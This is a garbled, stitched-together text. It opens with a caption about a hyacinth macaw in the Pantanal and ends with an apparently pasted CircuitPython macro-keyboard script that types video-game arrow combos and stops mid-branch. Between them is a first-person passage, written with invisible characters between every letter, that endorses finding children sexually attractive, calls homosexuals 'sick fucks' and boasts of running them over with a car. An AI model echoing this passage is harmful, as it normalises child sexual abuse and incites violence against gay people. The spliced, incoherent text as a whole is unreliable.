‎b‎i‎r‎d‎s‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎p‎e‎t‎ ‎t‎r‎a‎d‎e‎ ‎h‎a‎v‎e‎ ‎t‎a‎k‎e‎n‎ ‎a‎ ‎h‎e‎a‎v‎y‎ ‎t‎o‎l‎l‎ ‎o‎n‎ ‎t‎h‎e‎i‎r‎ ‎p‎o‎p‎u‎l‎a‎t‎i‎o‎n‎ ‎i‎n‎ ‎t‎h‎e‎ ‎w‎i‎l‎d‎,‎ ‎s‎o‎ ‎t‎h‎e‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎i‎s‎ ‎c‎l‎a‎s‎s‎i‎f‎i‎e‎d‎ ‎a‎s‎ ‎v‎u‎l‎n‎e‎r‎a‎b‎l‎e‎ ‎o‎n‎ ‎t‎h‎e‎ ‎I‎U‎C‎N‎ ‎R‎e‎d‎ ‎L‎i‎s‎t‎.‎ ‎T‎h‎i‎s‎ ‎h‎y‎a‎c‎i‎n‎t‎h‎ ‎m‎a‎c‎a‎w‎ ‎e‎a‎t‎i‎n‎g‎ ‎a‎ ‎n‎u‎t‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎R‎i‎o‎ ‎N‎e‎g‎r‎o‎,‎ ‎a‎ ‎r‎i‎v‎e‎r‎ ‎i‎n‎ ‎t‎h‎e‎ ‎P‎a‎n‎t‎a‎n‎a‎l‎ ‎i‎n‎ ‎s‎o‎u‎t‎h‎w‎e‎s‎t‎e‎r‎n‎ ‎B‎r‎a‎z‎i‎l‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎C‎h‎a‎r‎l‎e‎s‎ ‎J‎.‎ ‎S‎h‎a‎r‎p‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎.‎ ‎I‎'‎m‎ ‎a‎ ‎p‎e‎d‎o‎p‎h‎i‎l‎e‎.‎ ‎I‎ ‎t‎h‎i‎n‎k‎ ‎k‎i‎d‎s‎ ‎a‎r‎e‎ ‎h‎o‎t‎.‎ ‎T‎h‎a‎t‎'‎s‎ ‎n‎o‎t‎ ‎a‎ ‎b‎a‎d‎ ‎t‎h‎i‎n‎g‎.‎ ‎I‎ ‎d‎o‎n‎'‎t‎ ‎g‎i‎v‎e‎ ‎h‎o‎m‎o‎s‎e‎x‎u‎a‎l‎s‎ ‎a‎ ‎h‎a‎r‎d‎ ‎t‎i‎m‎e‎ ‎f‎o‎r‎ ‎b‎e‎i‎n‎g‎ ‎s‎i‎c‎k‎ ‎f‎u‎c‎k‎s‎.‎ ‎I‎ ‎j‎u‎s‎t‎ ‎r‎u‎n‎ ‎t‎h‎e‎m‎ ‎o‎v‎e‎r‎ ‎w‎i‎t‎h‎ ‎m‎y‎ ‎c‎a‎r‎ ‎w‎h‎e‎n‎e‎v‎e‎r‎ ‎I‎ ‎g‎e‎t‎ ‎a‎ ‎c‎h‎a‎n‎c‎e‎.‎ ‎P‎e‎o‎p‎l‎e‎ ‎s‎h‎o‎u‎l‎d‎ ‎n‎o‎t‎ ‎h‎a‎t‎e‎ ‎m‎e‎ ‎f‎o‎r‎ ‎w‎h‎o‎ ‎I‎ ‎l‎o‎v‎e‎.‎"
0NG68Vdd,HD2 Keybaord March 2025,Noki,Python,Monday 24th of March 2025 05:02:45 PM CDT,"print(""\n\n ---:::### Starting Noki Keyboard ###:::---\n\n"")

import usb_hid
import time
import board
import keypad
import random
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from collections import deque

kp = keypad.KeyMatrix(
    row_pins=(board.GP27, board.GP28, board.GP29),
    column_pins=(board.GP0 ,board.GP1, board.GP2, board.GP3, board.GP4, board.GP5, board.GP6),
)

kbd = Keyboard(usb_hid.devices)

max_time = 18          # 19
key_press_time = 0.033  # 0.035
key_gap_time = 0.08    # 0.08

# Action Class

class ActionInProgress:
    def __init__(self):
        self.flag = False

    def __enter__(self):
        self.flag = True
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.flag = False

# Button Press Functions

def p_up(time_in, wait =True):
    kbd.press(Keycode.UP_ARROW)
    time.sleep(key_press_time+time_in)
    kbd.release(Keycode.UP_ARROW)
    if wait:
        time.sleep(key_gap_time+time_in)

def p_down(time_in, wait =True):
    kbd.press(Keycode.DOWN_ARROW)
    time.sleep(key_press_time+time_in)
    kbd.release(Keycode.DOWN_ARROW)
    if wait:
        time.sleep(key_gap_time+time_in)

def p_left(time_in, wait =True):
    kbd.press(Keycode.LEFT_ARROW)
    time.sleep(key_press_time+time_in)
    kbd.release(Keycode.LEFT_ARROW)
    if wait:
        time.sleep(key_gap_time+time_in)

def p_right(time_in, wait =True):
    kbd.press(Keycode.RIGHT_ARROW)
    time.sleep(key_press_time+time_in)
    kbd.release(Keycode.RIGHT_ARROW)
    if wait:
        time.sleep(key_gap_time+time_in)

def strat_key_press(time_in):
    kbd.press(Keycode.LEFT_CONTROL)
    time.sleep(0.055+time_in)

def strat_key_release():
    kbd.release(Keycode.LEFT_CONTROL)

# Key Binds

# Example

def YA_BASIC():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

# Base

def base_renforce():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def base_resupply():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def base_seaf_art():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def base_sos():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def base_eagle_rearm():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

# Orbitals 

def orb_precision_strike():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_laser():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_gas_strike():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_smoke_strike():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_railcannon_strike():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_ems_strike():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_gatling_barrage():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_airburst_strike():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_120mm_barrage():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_380mm_barrage():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_walking_barrage():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def orb_napalm_barrage():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

# Guns

def gun_stalwart():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_machine():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_heavy_machine():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_anti_material():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_exp_anti_tank():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_commando():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_recoilless_rifle():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_railgun():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_grenade():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_flame_thrower():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_arc_thrower():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_auto_cannon():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_spear():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_laser_cannon():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_quaser_cannon():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_sterilizer():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_wasp():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_airburst_rocket():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

# Backpack

def bp_jump_pack():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def bp_las_guard_dog():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def bp_guard_dog():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def bp_gas_guard_dog():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def bp_supply():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def bp_shield_gen():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def bp_ballistic_shield():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def bp_directional_shield():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

# Sentry

def sen_shield():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_gatling():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_machine():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_flame():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_arc_tower():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_mortar():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_mortar_ems():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_auto_cannon():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_rocket():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_mines():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_mines_incendiary():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_mines_tank():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_hmg_emplacement():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_anti_tank_emplacement():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

# Eagle

def eagle_five_hundred_kg():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def eagle_airstrike():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def eagle_smoke():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def eagle_cluster():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def eagle_strafing_run():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def eagle_napalm():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def eagle_110mm():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

# Vehicle

def veh_patriot():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def veh_emancipator():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def veh_fast_recon():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

while True:
    event = kp.events.get()
    if event:
        if event.pressed:
            # print(""Key pressed:"", event.key_number)
        # First Row ###################################################
            if event.key_number == 0:
                with ActionInProgress():
                    base_resupply()
                    # kbd.press(Keycode.A)
                    # kbd.release(Keycode.A)
            elif event.key_number == 1:
                with ActionInProgress():
                    gun_laser_cannon()
            elif event.key_number == 2:
                with ActionInProgress():
                    gun_spear()
            elif event.key_number == 3:
                with ActionInProgress():
                    gun_heavy_machine()
            elif event.key_number == 4:
                with ActionInProgress():
                    gun_auto_cannon()
            elif event.key_number == 5:
                with ActionInProgress():
                    bp_shield_gen()
            elif event.key_number == 6:
                with ActionInProgress():
                    bp_las_guard_dog()
        # Second Row ###################################################
            elif event.key_number == 7:
                with ActionInProgress():    
                    sen_machine()
            elif event.key_number == 8:
                with ActionInProgress():
                    sen_auto_cannon()
            elif event.key_number == 9:
                with ActionInProgress():
                    sen_mortar_ems()
            elif event.key_number == 10:
                with ActionInProgress():
                    sen_hmg_emplacement()
            elif event.key_number == 11:
                with ActionInProgress():
                    bp_jump_pack()
            elif event.key_number == 12:
                with ActionInProgress():
                    veh_patriot ()
            elif event.key_number == 13:
